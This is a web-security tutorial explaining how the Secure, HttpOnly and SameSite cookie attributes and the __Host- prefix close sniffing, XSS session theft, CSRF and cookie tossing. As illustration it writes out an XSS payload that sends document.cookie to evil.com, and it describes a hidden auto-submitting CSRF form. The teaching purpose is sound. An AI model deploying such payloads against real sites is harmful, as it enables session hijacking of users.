No flag is decorative. Each one exists because someone got burned first.

00 — How To Read This Lesson

Not "Best Practice" — A Named Attack, Closed

It's tempting to treat Secure; HttpOnly; SameSite=Lax as a checklist you copy-paste into every Set-Cookie header because "that's what security people say to do." That framing makes the attributes forgettable, because there's no story attached to them. The far more useful framing — and the one this lesson insists on — is: each attribute is the direct patch for one specific attack that was actually happening in the wild. Remove the attribute, and that exact attack becomes possible again. Nothing more mystical than that.

🎯 The Three Doors, Named Up Front
Secure closes the door on your cookie leaking over an accidental plaintext HTTP connection or being sniffed on an insecure network. HttpOnly closes the door on an XSS bug being used to steal your session cookie directly via JavaScript. SameSite closes the door on Cross-Site Request Forgery — a malicious site triggering a request to your bank using your browser's automatically-attached session cookie. Three different attackers, three different vectors, three different fixes. None of them substitute for each other.

All three attributes live in the same Set-Cookie header from the previous lesson — none require any change to how the browser fundamentally stores or re-sends cookies. They're all just extra rules layered onto the same two-header mechanism, narrowing exactly when and how the browser is willing to hand your cookie back out.

01 — Attribute One

Secure: The Attack It Closes

Without Secure, a cookie set over HTTPS is still eligible to be sent over a plain HTTP connection to the same domain — the browser doesn't care which scheme originally set it, only whether the current request's scheme, domain, and path match. That's the crack.

⚔️ The Attack

Network-Level Sniffing / Downgrade

You're on public WiFi, logged into bank.com over HTTPS. Somewhere on the network, an attacker intercepts traffic. If any page ever loads even one resource over plain http://bank.com/... — a stray image, a redirect, an attacker actively forcing a downgrade — the browser will happily attach your session cookie to that unencrypted request. The attacker, sitting on the same network, reads it straight off the wire in plaintext and now owns your session.

🛡️ The Fix

Secure

The Secure attribute tells the browser: never attach this cookie to a request unless the connection is HTTPS. Full stop, no exceptions, no fallback. If a page really does end up requesting the HTTP version of the site, the cookie simply doesn't go — the attacker's sniffer sees nothing usable, because there was never a plaintext copy of the cookie to intercept.

HTTP Response HeaderSet-Cookie: session_id=8f14e45fceea167a5a36dedd4bea2543; Secure; Path=/
Secure protects the wire, not the endpoints. A cookie marked Secure is still fully readable by legitimate JavaScript on the page (unless also HttpOnly) and still visible to anyone with access to the browser itself. Secure only ever answers one question — "is this specific network hop encrypted?" — nothing more. That's precisely why it's paired with HSTS (Strict-Transport-Security) in real deployments, which stops the browser from ever attempting the plaintext HTTP request in the first place.
02 — Attribute Two

HttpOnly: The Attack It Closes

Without HttpOnly, any JavaScript running on the page — including JavaScript the site's own developers never wrote — can read every non-HttpOnly cookie via document.cookie. That includes your session cookie, in plaintext, as a string.

⚔️ The Attack

XSS Session Theft

Suppose a comment field on a forum fails to escape user input, and an attacker posts a comment containing <script>fetch('https://evil.com/steal?c='+document.cookie)</script>. Anyone who views that comment runs the attacker's script, in the forum's own origin, with full access to document.cookie. The script reads the victim's session cookie and ships it straight to the attacker's server. The attacker pastes that stolen value into their own browser and is now logged in as the victim — no password needed, no further interaction required.

🛡️ The Fix

HttpOnly

The HttpOnly attribute removes the cookie from JavaScript's visibility entirely. document.cookie simply never includes it, from any script, on any page, no matter how the script got there. The exact same XSS payload still executes — HttpOnly does nothing to stop the injection itself — but document.cookie now returns an empty string where the session ID used to be. The theft attempt runs and comes back with nothing.

HTTP Response HeaderSet-Cookie: session_id=8f14e45fceea167a5a36dedd4bea2543; Secure; HttpOnly; Path=/
📌 HttpOnly Is Damage Control, Not a Cure
HttpOnly does not fix the underlying XSS vulnerability — the attacker's script still runs, in the victim's browser, in the site's own origin. It just closes the single most common post-XSS pivot: exfiltrating the raw cookie value to read later. If the XSS-holding page instead issues an authenticated fetch() or XMLHttpRequest with credentials: 'include', the browser will still automatically attach the HttpOnly cookie to that request — the attacker can trigger actions "as you" in real time, they just can't walk away with the token itself. If this project's Content-Security-Policy material (module B13_csp) is what you covered right before this, this is the same relationship it draws: CSP tries to stop the injected script from running at all, while HttpOnly assumes it might run anyway and limits what it can steal. Defense in depth, not either/or.
03 — Attribute Three

SameSite: The Attack It Closes

This is the attribute that directly targets the automatic re-attachment behavior from the previous lesson. Recall: the browser attaches your cookies to a matching request no matter what triggered that request — your own click, or a hidden form on a completely different website that you merely had the misfortune of visiting.

⚔️ The Attack

Cross-Site Request Forgery (CSRF)

You're logged into bank.com — a valid session cookie sits in your browser's jar. You then visit totally-innocent-cat-pictures.com, run by an attacker. That page contains a hidden auto-submitting form: <form action="https://bank.com/transfer" method="POST"> with fields for destination account and amount, submitted automatically by a script the instant the page loads. Your browser doesn't know or care that this POST originated from a shady cat photo site — it sees a request headed to bank.com, finds a matching cookie in the jar, and attaches it automatically, exactly as designed. bank.com receives what looks like a fully authenticated transfer request, because as far as the cookie mechanism is concerned, it is one.

🛡️ The Fix

SameSite

The SameSite attribute tells the browser to withhold a cookie on requests that are cross-site — triggered by a different site than the one the cookie belongs to — regardless of whether that request would otherwise match on domain and path. It has three settings, each drawing the line in a different place, covered attribute-value by attribute-value below.

HTTP Response HeaderSet-Cookie: session_id=8f14e45fceea167a5a36dedd4bea2543; Secure; HttpOnly; SameSite=Lax; Path=/

Strict — the maximal answer

SameSite=Strict withholds the cookie on every cross-site request, full stop — including a top-level navigation where you personally click a link from another site straight to bank.com. This closes CSRF completely, but at a real usability cost: if a user clicks a link to bank.com/dashboard from an email or another site, that first request arrives with no session cookie attached, and the user appears logged out even though they have a valid session. The DECISIONS.md for this project's B17_cookies module documents exactly this trade-off with OAuth redirect flows, where the identity provider's redirect back to your app is itself a cross-site navigation.

Lax — the modern default

SameSite=Lax is more surgical: it withholds the cookie on cross-site sub-resource requests — the hidden auto-submitting form, an image tag, a background fetch(), an iframe load — but still allows it on a cross-site top-level navigation using a safe method (essentially, GET, as when you click a normal link). This is the setting that stops the cat-pictures CSRF attack above dead while still letting a bookmarked or emailed link to bank.com work normally. Since Chrome 80 (February 2020), browsers treat a cookie with no explicit SameSite attribute as Lax by default — a deliberate, retroactive fix applied to the entire existing web, because the original, no-restriction default was the whole reason CSRF was ever this widespread.

None — explicitly opting back out

SameSite=None restores the old, unrestricted behavior: the cookie is sent on every cross-site request, full stop. Browsers require None to be paired with Secure — an unencrypted, fully cross-site-exposed cookie is considered unacceptable even by the "opt out of protection" setting. Legitimate cross-site cookie uses (third-party embeds, cross-site single sign-on, ad measurement) require None, which is exactly why an attacker can't just declare their forged request "not cross-site" — the classification is based on where the request actually originates, not on anything the attacker controls.

What the enforcement logic actually checks

This isn't hand-wavy — it's a concrete decision made once per outgoing request, per stored cookie. This project's own browser module implements it directly; the core check in cookie.c boils down to this shape:

cookie.c — simplifiedint should_send_cookie(cookie_t *c, http_request_t *req, int is_top_level_navigation) {
    /* Secure: only over HTTPS */
    if (c->secure && !req->is_https) return 0;

    /* SameSite check */
    int cross_site = !same_site_request(c->domain, req->origin);
    if (cross_site) {
        if (c->same_site == SAME_SITE_STRICT) return 0;
        if (c->same_site == SAME_SITE_LAX) {
            /* Lax: allow only GET top-level navigations */
            if (!is_top_level_navigation) return 0;
            if (strcmp(req->method, "GET") != 0) return 0;
        }
    }
    return 1;
}

Notice the order: Secure is checked completely independently of SameSite — a cookie can fail on either ground alone. And the SameSite=Lax branch is doing exactly two checks, both of which the hidden auto-submit form in this lesson's CSRF scenario fails: it isn't flagged as a genuine top-level navigation (the request didn't change the address bar of a page the user is actively looking at), and its method is POST, not GET. Fail either check and the function returns 0 — the cookie never leaves the jar.

There was briefly a looser version of Lax. Between 2019 and 2021 some browsers implemented a temporary "Lax + POST" grace period: a cookie with no explicit SameSite would still be sent on a cross-site top-level POST navigation for about two minutes after being set, specifically to avoid breaking OAuth flows that redirected via POST during the initial default-to-Lax rollout. It was later removed after being identified as its own narrow CSRF window — a reminder that even a security default's own transition period can become an attack surface if left in place too long.

✅ Exactly What Lax Checks at Send Time
When the hidden form on evil.com submits to bank.com/transfer, the browser's cookie-attachment logic asks two questions: is this request cross-site (yes — the initiating page's site is evil.com, the destination is bank.com), and if so, is this a top-level navigation using a safe method? A form auto-submitted via JavaScript in the background is neither a top-level navigation the user directly initiated in a meaningful sense, nor — critically — a GET. SameSite=Lax answers "withhold the cookie" for exactly this shape of request, which is precisely why the request that reaches bank.com in the protected run arrives with no session cookie, and the server has no way to treat it as an authenticated action.

🔑 The One Table Worth Memorizing
Notice the "does NOT protect against" column is never empty. There is no single attribute that is a general-purpose "make this cookie safe" switch — each one answers a narrow, specific question about one specific attacker capability. A cookie with Secure but no HttpOnly is still fully stealable by an XSS bug. A cookie with HttpOnly but no SameSite is still forgeable by a CSRF attack. Real production cookies use all three together precisely because they defend against three attackers who don't need each other's permission to try.
You can see all three flags on any real site right now. Open DevTools (F12), go to the Application panel (Chrome/Edge) or Storage panel (Firefox), and select Cookies under a site you're logged into. Real dedicated columns show Secure, HttpOnly, and SameSite per cookie, no guessing required. Then flip to the Console tab and run document.cookie — you'll see it returns a string containing every non-HttpOnly cookie, and conspicuously omits any that are. That gap between what document.cookie shows and what the Cookies panel lists is HttpOnly, made visible.
06 — A Fourth, Quieter Fix

Cookie Prefixes: __Host- and __Secure-

Everything so far controls how a cookie is sent. This last one controls something upstream of that: what a script or a sibling subdomain is even allowed to set in the first place — because it turns out "which cookie does the server think it received" has its own attack, independent of Secure, HttpOnly, and SameSite entirely.

⚔️ The Attack

Cookie Tossing (Subdomain Cookie Injection)

Recall from the previous lesson that cookie matching is based on name + domain + path, not on which host actually set the cookie. If bank.com reads a cookie named session_id, and an attacker controls — or has compromised via XSS — any subdomain like promo.bank.com, that attacker can set their own Set-Cookie: session_id=attacker_controlled_value; Domain=bank.com; Path=/. Depending on ordering and matching rules, the browser may now send the attacker's forged session_id to bank.com instead of, or alongside, the legitimate one — effectively "tossing" a cookie in from the side, past a boundary the application never suspected it needed to defend. The application code has no way to know, just from reading Cookie: session_id=..., that the value didn't originate from the same trusted login flow.

🛡️ The Fix

__Host- Prefix

A cookie name starting with the literal prefix __Host- comes with browser-enforced rules baked into the name itself: the Set-Cookie header must include Secure, must not include a Domain attribute (host-only, matching Section 04 of the previous lesson), and must set Path=/. If any of those three conditions are violated, the browser silently refuses to store the cookie at all. Because Domain is forbidden, only bank.com itself — never promo.bank.com or any other subdomain — could ever have legitimately set a cookie named __Host-session_id. The prefix turns a convention into something the browser actively polices.

HTTP Response HeaderSet-Cookie: __Host-session_id=8f14e45fceea167a5a36dedd4bea2543; Secure; HttpOnly; SameSite=Lax; Path=/
PrefixEnforced requirementsGuarantees
__Secure-Set-Cookie must include SecureCookie was set over HTTPS — weaker guarantee, Domain still allowed
__Host-Must include Secure, no Domain attribute, Path=/Cookie is strictly host-only — no subdomain could have set it, closing the cookie-tossing vector entirely
Why isn't this just called "HostOnly" as a real attribute? Because putting the guarantee in the name, not a separate attribute, means any code anywhere that reads document.cookie or logs raw Set-Cookie headers can see the guarantee at a glance, without cross-referencing attribute lists — and more importantly, a server can trust the name itself as proof the browser already validated the constraints before ever storing it. This mirrors the same "widen the domain deliberately or accept the narrower default" trade-off from the previous lesson's domain-scoping section — __Host- is simply the mechanism for a site that wants to guarantee it's opted into the narrowest possible scope, permanently.
07 — Beyond the Three Attributes

Why Defense in Depth Still Matters

Even with Secure, HttpOnly, and SameSite=Lax all correctly set, a genuinely determined or well-positioned attacker isn't fully locked out — which is exactly why real systems layer additional protections on top rather than treating cookie attributes as the finish line.

🧾 CSRF Tokens (Synchronizer Pattern)

A random, per-session token embedded as a hidden form field and validated server-side on every state-changing request. Because the Same-Origin Policy stops a cross-site attacker's script from reading the victim's page, the attacker can never learn the correct token value to forge a request with — a defense that works even against browsers that predate the SameSite default.

🧬 SameSite=Lax Still Allows GET

Lax explicitly permits cross-site top-level GET navigations, so a state-changing action ever exposed behind a plain GET endpoint (an old anti-pattern, but it still exists in the wild) can still be triggered from an attacker's link. This is a standing argument for never putting a state change behind GET, independent of any cookie attribute.

HttpOnly's limits point in the same direction: it stops the simplest cookie-exfiltration pivot, but an XSS bug that can run fetch() with credentials can still perform actions as the victim in real time, cookie theft or not. That's why the origin-security material in this project — the Same-Origin Policy and CORS coverage, and the CSP module (B13_csp) — treats stopping the injection itself as the actual first line of defense, with HttpOnly and SameSite as the safety net for when that first line fails.

The double-submit cookie pattern, for when there's no server-side session

The synchronizer pattern above has one dependency worth naming: it requires the server to remember the expected token somewhere — session state. That's a non-issue for a traditional session-cookie app, but it's an awkward fit for stateless APIs authenticated with a JWT, where the whole point is often to avoid server-side session storage. The double-submit cookie pattern solves CSRF without that dependency: the server sets a second, random token in a cookie that is not HttpOnly (deliberately, so JavaScript on the legitimate page can read it), and the page's own script reads that cookie value and resends it as a custom header or form field on every state-changing request. The server then just checks that the header value matches the cookie value — no session lookup required.

🔑 Why This Still Stops CSRF Even Though the Attacker Can See the Cookie Exists
The attacker's forged cross-site form can trigger the browser to send the double-submit cookie automatically (same as any other cookie, subject to the SameSite rules already covered) — but the attacker's page runs on a different origin, and the Same-Origin Policy blocks it from reading that cookie's value with its own script to copy into the required header. It can cause the cookie to be attached; it cannot read what's inside it to forge the matching header. The two independent channels — the automatically-attached cookie and the JavaScript-read-and-resubmitted header — are exactly what an attacker's cross-origin page cannot both control at once.

This is also the direction the CSRF token demo in this project's B17_cookies module points toward as a "sharpen your pencil" exercise: design a CSRF defense for a JWT stored in a cookie, without server-side state. Double-submit is that answer — and it's a good illustration of how HttpOnly and CSRF-defense strategy actively trade off against each other: the double-submit token cookie is deliberately not HttpOnly, because the whole scheme depends on JavaScript being able to read it, while the actual session/auth cookie right next to it should still be HttpOnly. Not every cookie in an application needs — or should have — identical attributes.

🎯 The One-Sentence Summary
Secure stops your cookie from leaking over the wire, HttpOnly stops it from leaking through injected JavaScript, and SameSite stops it from being weaponized by a request you never intended to send — three independent locks on three independent doors, and skipping any one of them leaves that specific door wide open no matter how well the other two are secured.
08 — Quick Reference

Glossary & Key Terms

Secure
Cookie attribute restricting transmission to HTTPS connections only, closing plaintext network sniffing and downgrade attacks.
HttpOnly
Cookie attribute hiding the cookie from JavaScript's document.cookie, closing the most common XSS session-theft pivot.
SameSite
Cookie attribute controlling whether the cookie is sent on cross-site requests, closing classic CSRF. Values: Strict, Lax, None.
CSRF (Cross-Site Request Forgery)
An attack where a malicious site triggers a request to another site, relying on the victim's browser to auto-attach valid session cookies.
XSS (Cross-Site Scripting)
An attack where malicious script gets injected into and executed within a trusted page's own origin, e.g. via unescaped user input.
Top-Level Navigation
A request that changes the browser's address bar / main document, as opposed to a background sub-resource request like an image or fetch.
Cross-Site Request
A request whose initiating site differs from its destination site — the classification SameSite uses to decide cookie eligibility.
CSRF Token (Synchronizer Pattern)
A random, session-tied value embedded in forms and validated server-side, defending against CSRF independently of SameSite.
Session Hijacking
Using a stolen valid session identifier (e.g. via XSS cookie theft) to impersonate a logged-in user without their password.
Defense in Depth
Layering multiple independent protections so that failure of any single one doesn't fully compromise the system.
__Host- Prefix
A cookie-name prefix the browser enforces at storage time — requires Secure, no Domain, and Path=/ — guaranteeing the cookie is strictly host-only and closing cookie tossing.
Cookie Tossing
An attack where a malicious or compromised subdomain sets a cookie with the same name as a parent domain's cookie, exploiting name+domain+path matching that ignores which host actually set it.
